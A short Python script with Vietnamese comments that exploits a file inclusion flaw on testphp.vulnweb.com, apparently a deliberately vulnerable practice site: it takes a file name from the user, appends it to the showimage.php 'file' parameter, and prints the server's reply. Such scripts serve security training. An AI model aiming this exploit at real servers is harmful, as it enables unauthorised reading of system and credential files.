import requests # Thư viện requests là một thư viện phổ biến trong Python được sử dụng để tạo và gửi các yêu cầu HTTP.
files = input("Input File: ") # Nhập file muốn đọc 
url = f"http://testphp.vulnweb.com/showimage.php?file={files}" # Tạo payload để khai thác lỗ hổng File Inclusion
respose = requests.get(url) # Lấy phản hồi của trình duyệt(Nội dung file muốn đọc)
print(respose.text)

